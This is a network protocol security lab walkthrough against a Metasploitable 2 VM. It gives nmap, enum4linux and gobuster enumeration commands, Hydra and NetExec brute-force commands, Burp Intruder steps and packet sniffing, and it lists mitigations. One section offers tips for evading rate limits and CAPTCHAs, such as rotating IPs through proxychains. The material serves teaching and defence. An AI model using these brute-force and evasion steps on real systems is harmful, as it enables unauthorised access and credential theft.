# Network Protocol Security Lab Walkthrough

## 1. Lab Setup
### Objective
The goal of this lab is to explore vulnerabilities in common network protocols (FTP, TELNET, SSH, HTTP) by performing brute force attacks, sniffing network traffic, and analyzing security weaknesses. Additionally, mitigation strategies will be proposed to improve security.

### Environment
- **Kali Linux** (Attacker Machine) ![alt text](image-1.png)
- **Metasploitable 2** (Target VM) ![alt text](image.png)
- **Tools Used:**
  - Hydra, Medusa, NetExec (Brute Force Attacks)
  - Burp Suite (HTTP Login Brute Force)
  - Wireshark, tcpdump (Traffic Sniffing)
  - Nmap, Enum4Linux (Enumeration)

## 2. Enumeration
### Scanning the Target Machine
First, identify open ports and services running on the target VM:
```bash
nmap -p 21,23,22,80 --script=ftp-anon,telnet-encryption,ssh-hostkey <TARGET_IP>
```
*Expected Output: A list of open ports and running services*

![alt text](image-2.png)

### Enumerating Usernames
For FTP, TELNET, and SSH:
```bash
enum4linux -a <TARGET_IP>
```
![alt text](image-3.png)
![alt text](image-4.png)
![alt text](image-5.png)
![alt text](image-6.png)
![alt text](image-7.png)
![alt text](image-8.png)
![alt text](image-9.png)
![alt text](image-10.png)
![alt text](image-11.png)

For HTTP:
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```
![alt text](image-12.png)
*Document any discovered usernames.*

## 3. Brute Force Attacks
### 3.1 FTP Brute Force Attack (Hydra)
```bash
hydra -L userlist.txt -P passlist.txt <TARGET_IP> ftp -V
```
![alt text](image-13.png)

### 3.2 TELNET Brute Force Attack (Hydra)
```bash
hydra -L userlist.txt -P passlist.txt <TARGET_IP> telnet -V
```
![alt text](image-14.png)

### 3.3 SSH Brute Force Attack (NetExec)
```bash
nxc ssh <TARGET_IP> -u userlist.txt -p passlist.txt
```
![alt text](image-15.png)

### 3.4 HTTP Login Brute Force Attack (Burp Suite)
1. Capture login request using Burp Suite Proxy.
2. Send it to **Intruder** and set attack type to **Cluster Bomb**.
3. Load username and password lists.
4. Start attack and analyze responses for successful logins.

![alt text](image-16.png)


## 4. Sniffing Network Traffic
### Capturing Packets using Wireshark
1. Open Wireshark:
```bash
sudo wireshark
```
2. Start capture on the network interface connected to the target.
3. Apply filters:
   - FTP: `tcp.port == 21`
   - TELNET: `tcp.port == 23`
   - SSH: `tcp.port == 22`
   - HTTP: `tcp.port == 80`
4. Identify unencrypted traffic containing credentials.

### Capturing Packets using tcpdump
```bash
sudo tcpdump -i eth0 port 21 or port 23 or port 22 or port 80 -w capture.pcap
```
Analyze `capture.pcap` in Wireshark.

![alt text](image-17.png)

## 5. Problems Encountered
- **Rate Limiting / Account Lockouts:** Some services limit failed attempts.
  - **Solution:** Use slow attack mode (`-t 1` in Hydra) or rotate IPs via proxychains.
- **CAPTCHA / Anti-Brute Force Mechanisms:** Some login forms block automated requests.
  - **Solution:** Modify request headers or use manual testing techniques.

## 6. Mitigation Strategies
| Protocol  | Vulnerability | Secure Alternative |
|-----------|--------------|--------------------|
| FTP       | Plaintext credentials | Use SFTP or FTPS |
| TELNET    | Unencrypted traffic  | Use SSH instead  |
| SSH       | Password brute force | Use SSH keys and 2FA |
| HTTP      | Unsecured login forms | Use HTTPS and implement rate-limiting |

## 7. Conclusion
- Brute force attacks were successfully performed against FTP, TELNET, SSH, and HTTP.
- Unencrypted credentials were captured from FTP and TELNET.
- Mitigation strategies, such as enforcing encryption and key-based authentication, improve security.

